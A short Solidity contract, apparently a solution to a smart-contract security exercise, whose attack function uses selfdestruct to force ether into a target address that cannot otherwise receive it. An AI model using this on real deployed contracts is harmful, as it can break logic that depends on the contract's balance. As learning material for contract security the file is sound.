// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    function attack(address payable _addr) external {
        selfdestruct(_addr);
    }
}
